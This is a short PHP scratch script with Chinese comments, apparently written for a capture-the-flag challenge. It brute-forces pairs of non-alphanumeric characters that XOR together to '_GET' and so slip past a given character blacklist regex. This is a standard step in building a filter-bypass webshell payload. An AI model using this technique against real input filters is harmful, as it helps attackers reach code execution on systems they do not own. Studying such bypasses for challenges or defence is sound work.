<?php
// 关键洞察：利用 PHP 的字符串异或特性
// 在 PHP 中，两个字符串异或会逐字符异或

// 测试字符串异或
$a = 'aaaa';
$b = 'AAAA';
$c = $a ^ $b;
echo "String XOR: $c\n";  // 应该是 \x00\x00\x00\x00

// 构造 _GET
// 我们需要两个字符串，异或后得到 _GET
// _ = 95, G = 71, E = 69, T = 84

// 找两个可用字符组成的字符串
// 字符串1: xxxx
// 字符串2: yyyy
// xxxx ^ yyyy = _GET

// 方法：找一个字符串，使得异或后得到目标
// 目标: _GET = chr(95).chr(71).chr(69).chr(84)

// 如果我们用 ${{ 和 :}}}
// $ = 36, { = 123, : = 58, } = 125
// $ ^ ? = 95  => ? = 36 ^ 95 = 123 = {
// { ^ ? = 71  => ? = 123 ^ 71 = 52 = 4 (数字，不可用)
// 需要重新计算

// 换个思路：用相同的字符组成字符串
// 比如 @@@@ ^ ???? = _GET

// @ = 64
// @ ^ ? = 95  => ? = 64 ^ 95 = 31 (不可见)
// @ ^ ? = 71  => ? = 64 ^ 71 = 7 (不可见)

// 用 # = 35
// # ^ ? = 95  => ? = 35 ^ 95 = 124 = | (可用！)
// # ^ ? = 71  => ? = 35 ^ 71 = 100 = d (字母，不可用)

// 用 $ = 36
// $ ^ ? = 95  => ? = 36 ^ 95 = 123 = { (可用！)
// $ ^ ? = 71  => ? = 36 ^ 71 = 99 = c (字母，不可用)

// 用 % = 37
// % ^ ? = 95  => ? = 37 ^ 95 = 122 = z (字母，不可用)

// 用 : = 58
// : ^ ? = 95  => ? = 58 ^ 95 = 101 = e (字母，不可用)

// 用 > = 62
// > ^ ? = 95  => ? = 62 ^ 95 = 57 = 9 (数字，不可用)

// 用 ) = 41
// ) ^ ? = 95  => ? = 41 ^ 95 = 118 = v (字母，不可用)

// 看来需要不同的字符组合
// 字符串1: $xyz
// 字符串2: {abc
// $ ^ { = 95 = _ (正确!)
// 现在需要 x ^ a = 71 = G
// 可用字符: ! # $ % ( ) * + - / : ; < > ? @ \ ] ^ { }

// 找 x 和 a 使得 x ^ a = 71
for($i = 33; $i < 127; $i++) {
    $x = chr($i);
    $forbidden = "/[\x00- 0-9A-Za-z\'\"\`~_&.,|=[\x7F]+/i";
    if(preg_match($forbidden, $x)) continue;
    $a_val = $i ^ 71;
    $a = chr($a_val);
    if(!preg_match($forbidden, $a)) {
        echo "G: '$x' ^ '$a' = " . (ord($x) ^ ord($a)) . "\n";
    }
}

// 找 x 和 a 使得 x ^ a = 69 = E
echo "\n";
for($i = 33; $i < 127; $i++) {
    $x = chr($i);
    $forbidden = "/[\x00- 0-9A-Za-z\'\"\`~_&.,|=[\x7F]+/i";
    if(preg_match($forbidden, $x)) continue;
    $a_val = $i ^ 69;
    $a = chr($a_val);
    if(!preg_match($forbidden, $a)) {
        echo "E: '$x' ^ '$a' = " . (ord($x) ^ ord($a)) . "\n";
    }
}

// 找 x 和 a 使得 x ^ a = 84 = T
echo "\n";
for($i = 33; $i < 127; $i++) {
    $x = chr($i);
    $forbidden = "/[\x00- 0-9A-Za-z\'\"\`~_&.,|=[\x7F]+/i";
    if(preg_match($forbidden, $x)) continue;
    $a_val = $i ^ 84;
    $a = chr($a_val);
    if(!preg_match($forbidden, $a)) {
        echo "T: '$x' ^ '$a' = " . (ord($x) ^ ord($a)) . "\n";
    }
}
?>
